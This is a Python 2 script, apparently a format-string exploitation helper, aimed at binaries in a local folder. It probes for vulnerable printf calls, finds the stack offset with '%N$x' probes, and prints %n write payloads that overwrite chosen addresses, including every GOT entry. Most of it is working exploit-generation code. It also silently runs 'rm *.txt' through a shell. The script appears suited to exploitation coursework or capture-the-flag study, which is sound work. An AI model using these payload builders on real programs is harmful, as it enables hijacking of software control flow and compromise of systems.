import os
import sys
from subprocess import Popen,PIPE,call

########################

def removeTempFiles():
	return Popen(["rm *.txt"],stdout=PIPE,close_fds=True,shell=True).communicate()[0].strip()

########################

def executeProgram(binaryName, formatString):
	return Popen([binaryName, formatString],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

def parseAddressSpace(binaryName):
	return Popen(["gdb", "-q", binaryName],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

def prepareSharedLibrary():
	return Popen(["make","-C","."],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

# Compares address.txt and procMap.txt contents 
# Checks if any address is in memory with w bit set.
def findVulnPrintf():
	with open('procMap.txt') as f:
		zones = []
		contents = f.read();
		for line in contents.split('\n'):
			if not line:
				continue
			memrange, perms, _ = line.split(None, 2)
			start, end = memrange.split('-')
			zones.append({
				'start': int(start, 16),
				'end': int(end, 16),
				'perms': perms
			})

	with open('address.txt') as f:
		address = f.read().splitlines()				


	for index in range(len(address)):
		for mapping in zones:
			if mapping["start"] <= int(address[index],16) < mapping["end"]:
				break

		# Check the memory permissions
		if "w" in mapping["perms"]:
			print("Format function no. %d has format string in writable memory." % (index+1));

########################

def calculateOffset(binaryName, formatString):
	output = "";
	arg = 1;	
	
	while(1):

		if(arg>50):
			return -1;		

		format =  formatString + "%" + str(arg) + "$x";		
		output = executeProgram(binaryName,format);

		if( formatString+"41414141" in output):
			print("Offset between format string and its address is: %d words" % arg);
			print("Format string used: %s" % format);
			return arg;

		arg = arg + 1;

########################

def prepareFormatString(dummyString, addressToWrite, addressToOverwrite, distanceInWords):

	#Pad 0's to make address length to 8
	length = 8 - len(addressToWrite); 
	addressToWrite = length*'0' + addressToWrite;

	length = 8 - len(addressToOverwrite); 
	addressToOverwrite = length*'0' + addressToOverwrite;

	splitsAddressToOverwrite = [addressToOverwrite[x:x+2] for x in range(0,len(addressToOverwrite),2)]
	splitsAddressToWrite = [addressToWrite[x:x+2] for x in range(0,len(addressToWrite),2)]

	byte = [None]*4;

	for index in range(0, 4): 
		byte[index] = format(int(splitsAddressToOverwrite[3], 16) + index ,'x');
		byte[index] = byte[index] if (len(byte[index]) == 2) else "0"+byte[index];

	addressString = dummyString;
	for index in range(0, 4):
		addressString = (addressString + "\\x"+byte[index]+"\\x"+splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0]);

	initialNum = len(dummyString)+16;
	offset = [None]*4;

	offset[0] = int(splitsAddressToWrite[3],16) - initialNum;
	if offset[0] < 8:
		 offset[0] = int(splitsAddressToWrite[3],16) + 256 - initialNum;

	j = 1;
	for index in xrange(3, 0, -1): 
		offset[j] = int(splitsAddressToWrite[index-1],16) - int(splitsAddressToWrite[index],16);
		if offset[j] < 8:
			 offset[j] = int(splitsAddressToWrite[index-1],16) + 256 - int(splitsAddressToWrite[index],16);
		j = j + 1;

	distanceInWords = distanceInWords + len(dummyString)/4;
	exploitString = "";

	for index in range(0, 4):
		exploitString = (exploitString + "%" + str(distanceInWords) + "\$" + str(offset[index]) + "x%" + str(distanceInWords+index) + "\$n");

	finalExploitString = addressString + exploitString;
	#print (finalExploitString);
	return finalExploitString;

########################

def exportShellCode():
	return -1;

# Write function which exports custom/default shell code and returns its address
# Write function which shows the addresses of GOT entries which can be overwritten

########################

def findAllGOTAddresses(binaryName):
	p1 = Popen(["objdump", "--dynamic-reloc", binaryName], stdout=PIPE)
	p2 = Popen(["cut", "-d ", "-f1"], stdin=p1.stdout, stdout=PIPE).communicate()[0]

	zones = [];

	for line in p2.split('\n'):
		if not line:
			continue
		zones.append(line)

	del zones[0:3];
	return zones;

########################

def main():

	if(len(sys.argv) < 2):
		print("Usage: python formatStringExploit.py binaryName")
		return;
	
	binaryName = os.environ["PWD"] + "/binaries/" + (sys.argv)[1];	
	
	if os.path.isfile(binaryName) == False:
		print("%s does not exist!" % sys.argv[1]); 

	#Remove Temporary files
	removeTempFiles();
	dummyString = "";
	r = 11;

	print("\n\
	1. Auto find if vulnerable.\n\
	2. Auto find distance between format string and its address in words.\n\
	3. Provide addToWrite,addToOverwrite and distance in words to get exploit string.\n\
	4. Provide addToWrite and distance in words to auto create potential exploit strings using GOT addresses.\n\
	5. Quit");

	while True:	
	    choice = raw_input("-> ").lower().rstrip()
	    if choice=="1":
			parseAddressSpace(binaryName);		
			prepareSharedLibrary();
			os.environ["LD_PRELOAD"] = os.environ["PWD"] + "/customFormatFunctions.so";
			output = executeProgram(binaryName, "test");
			del os.environ["LD_PRELOAD"];
			findVulnPrintf();

	    elif choice=="2":
			r = calculateOffset(binaryName, "AAAA");	
			dummyString = "AAAA";
			if(r == -1):
				r = calculateOffset(binaryName, "AAAAA");
				dummyString = "AAAAA";
				if(r == -1):
					print("Cannot find offset");
					dummyString = "";

	    elif choice=="3":
			print("Enter addressToWrite, addressToOverwrite, Offset: (e.g., 080905040 080905044 11)")
			choice = raw_input();
			values = choice.split();
			exploitString = prepareFormatString(dummyString,values[0],values[1],int(values[2]));
			print exploitString;	

	    elif choice=="4":

			print("Enter addressToWrite and the Offset: (e.g., 080905040 11)")
			choice = raw_input();
			values = choice.split();

			gotAddresses = findAllGOTAddresses(binaryName);
			for i in range(len(gotAddresses)):
				exploit = prepareFormatString(dummyString,values[0],gotAddresses[i],int(values[1]));	
				print("Exploit %d: %s\n-------" % ((i+1), exploit));

	    elif choice=="5":
	        break;
	    else:
	        print("Invalid choice, please choose again\n")

if __name__ == '__main__':
	main()
